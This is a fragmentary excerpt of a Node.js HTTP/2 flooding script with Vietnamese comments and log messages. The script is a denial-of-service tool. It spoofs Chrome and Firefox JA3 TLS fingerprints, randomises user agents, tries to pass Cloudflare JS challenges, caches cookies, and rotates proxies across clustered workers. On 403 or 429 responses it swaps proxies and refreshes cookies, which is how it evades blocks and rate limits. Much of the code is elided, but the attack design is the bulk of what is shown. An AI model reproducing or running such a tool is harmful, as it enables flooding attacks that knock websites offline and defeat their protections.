...
const JA3_FINGERPRINTS = [
    "771,4865-4866-4867-49195-49199-49196-49200,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24,0", // Chrome
    "771,4865-4866-4867-49195-49199,0-23-65281-10-11-35-16-5-13-18-51-45-43,29-23-24,0" // Firefox
];
...
const cookieStore = new Map(); // Lưu cookie với thời gian hết hạn
...
function getRandomJA3() {
    const ja3 = JA3_FINGERPRINTS[Math.floor(Math.random() * JA3_FINGERPRINTS.length)];
    const [version, ciphers, extensions] = ja3.split(',');
    return {
...
async function solveJSChallenge(targetUrl, proxyAddr) {
    try {
        const response = await fetch(targetUrl, {
            ...
            headers: {
                'User-Agent': browsers[Math.floor(Math.random() * browsers.length)].userAgent,
        ...
        if (challengeScript && challengeScript.includes('cf_chl')) {
            ...
            // Giả lập giải challenge đơn giản (cần logic cụ thể nếu challenge phức tạp)
        }
...
async function getOrRefreshCookie(proxyAddr, targetUrl) {
    ...
    if (storedCookie && storedCookie.expiry > Date.now() + COOKIE_REFRESH_THRESHOLD) {
        console.log(`[>] Sử dụng cookie đã lưu cho ${host}`);
...
if (cluster.isMaster) {
    ...
    loadCookies().then(() => {
        loadValidProxies(args.proxyFile).then(validProxies => {
            ...
            if (proxies.length === 0) {
                console.log("[!] Không tìm thấy proxy hợp lệ!");
                process.exit();
            }
            ...
            const restartScript = () => {
                ...
                console.log('[>] Khởi động lại script sau 1000ms...');
                setTimeout(() => {
            ...
            const handleRAMUsage = () => {
                ...
                if (ramPercentage >= 99) {
                    console.log('[!] RAM sử dụng tối đa:', ramPercentage.toFixed(2), '%');
                    restartScript();
                }
            };
    ...
    async function runFlooderWithRetry(maxRetries = 3, initialDelay = 1000) {
        ...
        while (retries < maxRetries) {
            try {
                ...
                console.log(`[!] Lỗi: ${error}, thử lại sau ${delay}ms (${retries}/${maxRetries})`);
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
        console.log('[!] Vượt quá số lần thử lại, đổi proxy...');
...
async function runFlooder() {
    if (proxies.length === 0) {
        console.log("[!] Không có proxy hợp lệ, dừng lại...");
        return;
    }
    ...
    if (!cookie) {
        failedAttempts++;
        console.log(`[!] Không lấy được cookie, thử lại... (${failedAttempts}/${MAX_FAILED_ATTEMPTS})`);
        if (failedAttempts >= MAX_FAILED_ATTEMPTS) {
            console.log("[!] Quá nhiều lần thất bại, làm mới proxy...");
            proxies = await loadValidProxies(args.proxyFile);
            failedAttempts = 0;
        }
        return;
                    ...
                    setTimeout(() => {
                        ...
                        request.on('response', (response) => {
                            if (response[":status"] === 403 || response[":status"] === 429) {
                                console.log(`[!] Nhận mã ${response[":status"]}, đổi proxy và làm mới cookie...`);
                                failedAttempts++;
                                client.destroy();
                                tlsConn.destroy();
                                connection.destroy();
                                ...
                                if (response["set-cookie"]) {
                                    ...
                                    if (newCookies) {
                                        ...
                                        saveCookies();
                                        console.log(`[>] Cập nhật cookie: ${newCookies}`);
                                        failedAttempts = 0;
                                    }
                                }
                                request.close();
